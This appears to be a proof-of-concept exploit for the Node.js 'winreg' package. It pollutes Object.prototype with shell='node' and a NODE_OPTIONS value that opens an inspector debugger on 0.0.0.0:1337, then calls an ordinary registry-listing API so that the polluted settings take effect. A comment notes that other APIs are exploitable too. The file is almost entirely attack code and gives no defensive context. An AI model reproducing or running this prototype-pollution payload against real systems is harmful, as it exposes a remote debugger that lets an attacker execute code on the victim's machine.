var Registry = require('winreg')
,   regKey = new Registry({                                       // new operator is optional
      hive: Registry.HKCU,                                        // open registry hive HKEY_CURRENT_USER
      key:  '\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' // key containing autostart programs
    })

Object.prototype.shell = 'node'
Object.prototype.NODE_OPTIONS = '--inspect-brk=0.0.0.0:1337';

// list autostart programs
// other APIs are exploitable also
regKey.values(function (err, items /* array of RegistryItem */) {
  if (err)
    console.log('ERROR: '+err);
  else
    for (var i=0; i<items.length; i++)
      console.log('ITEM: '+items[i].name+'\t'+items[i].type+'\t'+items[i].value);
});